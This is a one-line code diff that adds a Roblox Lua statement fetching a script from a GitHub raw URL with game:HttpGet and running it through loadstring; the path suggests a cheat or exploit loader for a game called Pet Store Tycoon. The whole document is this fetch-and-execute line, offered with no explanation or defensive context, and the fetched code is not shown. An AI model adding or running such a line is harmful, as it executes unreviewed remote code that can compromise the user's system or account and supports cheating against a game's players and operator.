@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/pet-store-tycoon-spam4-f3bebno0hs93mc.lua"))()
